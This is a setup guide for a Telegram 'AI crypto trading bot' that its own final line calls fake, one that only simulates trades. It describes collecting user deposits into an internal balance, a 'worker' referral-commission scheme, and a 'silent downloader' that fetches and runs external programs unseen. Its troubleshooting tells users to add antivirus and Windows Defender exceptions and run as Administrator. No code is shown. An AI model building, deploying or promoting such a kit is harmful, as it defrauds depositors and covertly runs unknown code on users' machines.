# XanosTrade

​# 🤖 Advanced AI Crypto Trading Bot - Setup Guide

## 📋 Overview

A comprehensive Telegram bot for cryptocurrency trading with AI chat, referral system, admin dashboard, and automated trading features.

## 🎯 Features

### Core Features
- **Automated Trading**: Multi-blockchain trading with stop-loss/take-profit
- **AI Chat Integration**: Gemini AI assistant for trading advice
- **Referral System**: Worker codes and commission tracking
- **Multi-Wallet Support**: Ethereum, BSC, Polygon, Arbitrum
- **Real-time Monitoring**: Price alerts and trade notifications
- **Admin Dashboard**: User management and system statistics

### Advanced Features
- **Background Services**: Silent external process management
- **Deposit Monitoring**: Automatic blockchain transaction detection
- **Support System**: Ticket-based customer support
- **Internal Balance**: USD-based trading without direct wallet access
- **PKG Executable**: Standalone .exe for Windows deployment

## 🛠️ Installation & Setup

### Prerequisites
- **Node.js** 18+ 
- **MongoDB** (local or cloud)
- **Telegram Bot Token** (from @BotFather)
- **Admin Telegram ID**
- **Log Group/Channel ID**

### Step 1: Download & Extract
```bash
# Extract bot files to desired directory
# Example: C:\CryptoBot or /home/user/cryptobot
```

### Step 2: Run Initial Setup
```bash
# For source code version:
node startup.js

# For .exe version:
./crypto-trading-bot.exe
```

### Step 3: Configuration Wizard
The bot will prompt for required information:

1. **Bot Token**: Get from @BotFather
2. **Bot Username**: Your bot's username (without @)
3. **Admin Telegram ID**: Your Telegram user ID
4. **Log Group ID**: Group/channel for bot logs (format: -1001234567890)
5. **Optional APIs**:
   - Moralis API Key (blockchain data)
   - Gemini API Key (AI chat)

### Step 4: MongoDB Setup

#### Local MongoDB (Recommended)
```bash
# Install MongoDB Community Server
# Windows: Download from mongodb.com
# Linux: sudo apt install mongodb

# Start MongoDB service
# Windows: Services → MongoDB → Start
# Linux: sudo systemctl start mongod
```

#### MongoDB Collections (Auto-created)
- `users` - User accounts and balances
- `trades` - Trading history
- `transactions` - Deposit/withdrawal records
- `supporttickets` - Customer support
- `workers` - Referral system data

### Step 5: Verify Installation
- Bot shows "✅ Telegram Bot: Online"
- Test with `/start` command
- Check `/status` for system health

## 🎮 Bot Commands

### User Commands
- `/start` - Initial registration and authorization
- `/code` - Enter invitation code
- `/seeref` - View referral statistics

### Admin Commands
- `/status` - System status and background services
- `/debug` - Detailed system information
- `/configstatus` - Configuration verification
- `/testsilent` - Test background download system
- `/services` - All services status
- `/processes` - Windows process monitoring
- `/dirs` - Directory structure check

## 🖥️ Bot Interface

### Main Menu Buttons
- **💰 Deposit** - Add funds to internal balance
- **💸 Withdraw** - Withdraw to external wallet
- **📊 Balance** - Check current balance
- **📈 Trade** - Access trading features
- **⚙️ Settings** - User preferences
- **🎯 Support** - Create support tickets
- **🤖 Talk to AI** - Chat with AI assistant
- **ℹ️ About Bot** - Bot information

### Admin/Worker Dashboard
- **👨‍💼 Admin Dashboard** - User management, statistics
- **👷 Worker Dashboard** - Referral tracking, earnings

## 🔧 Configuration Files

### Auto-Generated Files
```
%USERPROFILE%\.crypto-trading-bot\
├── config\
│   ├── config.json     # Main configuration
│   └── .env           # Environment variables
├── external\          # Downloaded resources
└── logs\             # Application logs
```

### Manual Configuration (Optional)
Edit `config/config.json` for advanced settings:
```json
{
  "TELEGRAM_BOT_TOKEN": "your_token",
  "BOT_USERNAME": "your_bot",
  "ADMIN_TELEGRAM_ID": "your_id",
  "LOG_GROUP_ID": "-1001234567890",
  "MINIMUM_DEPOSIT_USD": "50",
  "MONGODB_URI": "mongodb://127.0.0.1:27017/crypto"
}
```

## 🚀 Background Services

### Silent Downloader
- Automatically downloads and runs external trading tools
- Operates silently in background
- Monitor with `/testsilent` command

### Process Management
- Auto-restart crashed services
- Memory and CPU monitoring
- Windows service integration

## 🔐 Security & Access Control

### Authorization System
1. **Public Access**: Disabled by default
2. **Invitation Codes**: Required for registration
3. **Worker System**: Referral-based access
4. **Admin Controls**: Full system access

### User Roles
- **Admin**: Full access, user management
- **Worker**: Referral system, limited admin
- **User**: Trading and basic features

## 💳 Trading Features

### Supported Blockchains
- Ethereum (ETH)
- Binance Smart Chain (BSC)
- Polygon (MATIC)
- Arbitrum (ARB)

### Trading Types
- **Single Token**: Individual token trades
- **Multi Token**: Portfolio trading
- **Snipe Trading**: New token launches
- **Copy Trading**: Follow successful traders

### Internal Balance System
- USD-based internal accounting
- Deposit → Internal Balance → Trading
- No direct wallet connection required

## 📊 Monitoring & Logs

### System Monitoring
```bash
# Check system status
/status

# View all services
/services

# Process monitoring
/processes
```

### Log Files
- Application logs: `logs/app.log`
- Error logs: `logs/error.log`
- Trade logs: `logs/trades.log`

## 🆘 Troubleshooting

### Common Issues

**Bot won't start:**
- Check Node.js version (18+)
- Verify MongoDB is running
- Check configuration completeness

**Download fails:**
- Check internet connection
- Verify Windows Defender exceptions
- Run as Administrator

**Database errors:**
- Ensure MongoDB service is running
- Check connection string
- Verify database permissions

**Process monitoring fails:**
- Run with Administrator privileges
- Check Windows firewall settings
- Verify antivirus exceptions

### Diagnostic Commands
```bash
# Test configuration
/configstatus

# Test downloads
/testsilent

# System diagnostics
/debug

# Directory check
/dirs
```

## 🔄 Updates & Maintenance

### Regular Maintenance
1. Monitor `/status` daily
2. Check log files weekly  
3. Backup configuration monthly
4. Update Node.js quarterly

### Backup Important Files
- `config/config.json`
- MongoDB database
- `logs/` directory

## 📞 Support

### Self-Help
1. Check `/debug` output
2. Review log files
3. Verify configuration
4. Test with `/testsilent`

### Getting Help
- Use bot's support system: 🎯 Support button
- Check system logs for error details
- Verify all prerequisites are met

## 🏁 Quick Start Checklist

- [ ] Node.js 18+ installed
- [ ] MongoDB running
- [ ] Bot token from @BotFather
- [ ] Admin Telegram ID obtained
- [ ] Log group created
- [ ] Bot executable downloaded
- [ ] Configuration completed
- [ ] `/start` command tested
- [ ] `/status` shows all green
- [ ] Background services running

## 📈 Production Deployment

### Windows Service (Optional)
- Use PM2 or NSSM for service installation
- Configure auto-start on boot
- Set up log rotation

### Monitoring
- Set up uptime monitoring
- Configure alert notifications
- Regular health checks

---

**🎉 Your AI Crypto Trading Bot is now ready for production use!**

Fake AI Trade/Snipe Bot. Only simulates trades, many other features. only for educational purposes
